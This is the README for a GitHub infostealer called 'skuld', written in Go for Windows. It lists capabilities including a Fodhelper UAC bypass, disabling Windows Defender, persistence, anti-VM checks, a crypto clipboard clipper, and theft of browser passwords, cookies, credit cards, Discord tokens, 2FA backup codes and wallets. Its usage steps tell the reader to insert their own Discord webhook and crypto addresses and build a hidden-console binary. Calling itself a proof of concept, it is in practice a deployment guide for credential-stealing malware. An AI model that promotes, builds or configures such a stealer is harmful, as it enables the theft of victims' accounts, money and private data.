## About the project

This proof of concept project demonstrates a "Discord-oriented" stealer implemented in Go, a language not commonly utilized for such purposes on GitHub. The malware is designed to operate on Windows systems and employs a method involving privilege escalation, specifically leveraging the well-known Fodhelper technique. By elevating privileges, the malware gains access to sensitive user data stored in all user sessions on every disk

### Features:

- **UAC Bypass:** Grants privileges to steal user data from others users. üïµÔ∏è‚Äç‚ôÇÔ∏è
- **Console hiding:** Module to hide the console. üï∂Ô∏è
- **Fake Error Simulation:** Trick user into believing the program closed due to an error. üé≠
- **Startup Persistence:** Ensures the program runs at system startup. üöÄ
- **Anti-debugging Measures:** Detects and exits when running in virtual machines (VMs). üîç
- **Antivirus Evasion:** Attempts to disable Windows Defender and block access to antivirus websites. ü¶†
- **System Information Retrieval:** Gathers CPU, GPU, RAM, IP, location, saved Wi-Fi networks, and more. üñ•Ô∏è
- **Chromium-based Browsers Data Theft:** Steals logins, cookies, credit cards, history, and download lists from 37 Chromium-based browsers.
- **Gecko Browsers Data Theft:** Steals logins, cookies, history, and download lists from 10 Gecko browsers. ü¶ä
- **Common Files Theft:** Steals sensitive files from common locations. üóÇÔ∏è
- **Discord Backup Codes Theft:** Captures Discord Two-Factor Authentication (2FA) backup codes. üîë
- **Wallet Data Theft:** Steals data from 10 local wallets and 55 wallet extensions. üí∞
- **Discord Tokens Theft:** Extracts tokens from 4 Discord applications, Chromium-based browsers, and Gecko browsers.
- **Games Data Theft:** Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions. üéÆ
- **[Discord Injection:](https://github.com/hackirby/discord-injection)**
  - Intercepts login, register, and 2FA login requests.
  - Captures backup codes requests.
  - Monitors email/password change requests.
  - Intercepts credit card/PayPal addition requests.
  - Blocks the use of QR codes for login.
  - Prevents requests to view devices.
- **[Crypto Wallets Injection:](https://github.com/hackirby/wallets-injection)**
  - Captures mnemonic phrases.
  - Captures passwords.
- **Crypto Clipper:** Replaces the user's clipboard content with a specified crypto address when copying another address. üìã

## Getting started

### Prerequisites

* [The Go Programming Language](https://go.dev/dl/)

### Installation
To install this project using Git, follow these steps:

- Clone the Repository:

```bash
git clone https://github.com/hackirby/skuld
```
- Navigate to the Project Directory:

```bash
cd skuld
```

## Usage

You can use the Project template:

- Open `main.go` and edit config with your Discord webhook and your crypto addresses

![](assets/config.png)

- Build the template: (You can reduce binary size by using `-s -w` and hide the console by using `-H=windowsgui` ldflags)

```bash
go build -ldflags "-s -w -H=windowsgui"
```


but you can also use skuld in your own Go code. Just import the desired module like this:
```go
package main

import (
  "github.com/hackirby/skuld/modules/hideconsole"
)

func main() {
  hideconsole.Run()
}
```

## Acknowledgments
This project has been greatly influenced by numerous infostealers available on GitHub. Many functions and sensitive paths have been derived from public repositories. My objective was to innovate by creating something new with code from existing projects. I extend my gratitude to all those whose work has contributed to this stealer, especially
- [FallenAstaroth](https://github.com/FallenAstaroth/stink) for tempfile-less browsers data extraction
- [·¥ç·¥è·¥è…¥D4 Ä·¥ã](https://github.com/moonD4rk/HackBrowserData) for browsers data decryption
- [addi00000](https://github.com/addi00000/empyrean) for Discord embeds design
- [Blank-c](https://github.com/Blank-c/Blank-Grabber) for antivirus-related functions and more
